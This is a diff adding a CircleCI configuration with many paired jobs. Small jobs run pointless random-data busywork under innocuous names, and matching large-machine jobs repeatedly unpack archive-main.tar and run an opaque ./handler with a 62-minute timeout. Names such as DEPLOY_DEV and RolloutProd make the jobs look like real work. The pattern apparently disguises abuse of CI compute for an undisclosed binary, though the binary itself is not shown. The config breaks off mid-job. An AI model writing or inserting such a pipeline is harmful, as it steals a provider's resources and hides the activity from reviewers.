@@ -1,0 +1,1783 @@
+version: 2.1
+
+jobs:
+  builder_preview-v3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Dispatch work units
+          command: |
+            mkdir -p /tmp/pipeline
+            set +o pipefail 2>/dev/null; seq 1 960816 | awk '{print $1*7919 % 2147483647}' > /tmp/pipeline/99.blob; true
+            du -h /tmp/pipeline/99.blob
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 99.blob
+  preview-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/99.blob || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  ctx2_LAB_HOOK_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 266240 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/pipeline/trace.txt
+            du -h /tmp/pipeline/trace.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - trace.txt
+  LAB_HOOK_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/trace.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  step1_teh-ci-40:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Fold branch counters
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 23068672 /dev/urandom | sha256sum; true ; } > /tmp/pipeline/stage-pass.txt
+            du -h /tmp/pipeline/stage-pass.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - stage-pass.txt
+  teh-ci-40:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/stage-pass.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  step2_hotfix-6015:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 10485760 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/pipeline/.sig
+            du -h /tmp/pipeline/.sig
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .sig
+  hotfix-6015:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/.sig || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  tester_DEPLOY_DEV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 90700 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/pipeline/step-5.txt
+            du -h /tmp/pipeline/step-5.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-5.txt
+  DEPLOY_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/step-5.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  retry_bob-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Rank ordinal values
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=8;a++)for(b=1;b<=13226;b++)s+=a*b;print s}'; true ; } > /tmp/pipeline/39.out
+            du -h /tmp/pipeline/39.out
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 39.out
+  bob-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/39.out || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  maker_tweak-cache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<216880;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/pipeline/handoff.txt
+            du -h /tmp/pipeline/handoff.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handoff.txt
+  tweak-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/handoff.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  resync_rm-router-glitch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Materialize sort order
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 51750; echo "ftr" ) | wc -l; true ; } > /tmp/pipeline/phase-complete.log
+            du -h /tmp/pipeline/phase-complete.log
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - phase-complete.log
+  rm-router-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/phase-complete.log || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  drain_APP-476:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Reduce text corpus
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1331200 | wc -c; true ; } > /tmp/pipeline/stats.csv
+            du -h /tmp/pipeline/stats.csv
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - stats.csv
+  APP-476:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/stats.csv || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  red_bug-588:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Build adjacency map
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 21136 | awk '{if($1&1)o++;else e++}END{print o"/"e}'; true ; } > /tmp/pipeline/stash.blob
+            du -h /tmp/pipeline/stash.blob
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - stash.blob
+  bug-588:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/stash.blob || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  stage_WEB-205:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Mirror config bundle
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=2500 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/pipeline/audit.txt
+            du -h /tmp/pipeline/audit.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - audit.txt
+  WEB-205:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/audit.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  Beta_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Trim duplicate rows
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 6291456 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/pipeline/467.txt
+            du -h /tmp/pipeline/467.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 467.txt
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/467.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  stepA_verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pack vendor fragments
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 409600 | fold -w8 | sort -u | wc -l; true ; } > /tmp/pipeline/handover.txt
+            du -h /tmp/pipeline/handover.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handover.txt
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/handover.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  teardown_Package_Prod5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Measure dwell time
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=24 2>/dev/null | sha256sum; true ; } > /tmp/pipeline/.state
+            du -h /tmp/pipeline/.state
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .state
+  Package_Prod5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/.state || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  generate_auh-check:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Churn allocator pool
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes abc | head -n 381254 | sha256sum; true ; } > /tmp/pipeline/log.gz
+            du -h /tmp/pipeline/log.gz
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.gz
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/log.gz || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  hydrate_Run_App2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Normalize counter rings
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 22020096 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/pipeline/READY.txt
+            du -h /tmp/pipeline/READY.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - READY.txt
+  Run_App2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/READY.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  ensure_run-nightly-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Measure throughput
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 365548 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/pipeline/27.out
+            du -h /tmp/pipeline/27.out
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 27.out
+  run-nightly-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/27.out || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  linter_edge-v7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Build summary row
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 17067 | md5sum; true ; } > /tmp/pipeline/2023-02-15.data
+            du -h /tmp/pipeline/2023-02-15.data
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2023-02-15.data
+  edge-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/2023-02-15.data || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  audit_refactor-4387:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot heap stats
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 24117248 /dev/urandom | sha256sum; true ; } > /tmp/pipeline/718.out
+            du -h /tmp/pipeline/718.out
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 718.out
+  refactor-4387:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/718.out || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  retry_RolloutProd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Scan vector span
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<408443;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/pipeline/relay.txt
+            du -h /tmp/pipeline/relay.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - relay.txt
+  RolloutProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/relay.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  p1_qi-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Flush pipeline cache
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 18592); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/pipeline/bundle
+            du -h /tmp/pipeline/bundle
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - bundle
+  qi-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/bundle || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  do_rl-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Compute spill delta
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 13824000 | base64 | head -c 200 | wc -c; true ; } > /tmp/pipeline/manifest
+            du -h /tmp/pipeline/manifest
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - manifest
+  rl-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/manifest || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  db_tweak-oauth:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Trim trailing newlines
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 24117248 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/pipeline/cache.raw
+            du -h /tmp/pipeline/cache.raw
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - cache.raw
+  tweak-oauth:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/cache.raw || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  C_chen-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 61440 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/pipeline/FINAL.txt
+            du -h /tmp/pipeline/FINAL.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - FINAL.txt
+  chen-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/FINAL.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  canary1_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 174080 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/pipeline/phase-pass.log
+            du -h /tmp/pipeline/phase-pass.log
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - phase-pass.log
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/phase-pass.log || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  dispatch_succes-only:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Rank query plans
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 460800 | fold -w8 | sort -u | wc -l; true ; } > /tmp/pipeline/step-12.log
+            du -h /tmp/pipeline/step-12.log
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-12.log
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/step-12.log || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  blue_tweak-login:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 4760); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/pipeline/807.txt
+            du -h /tmp/pipeline/807.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 807.txt
+  tweak-login:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
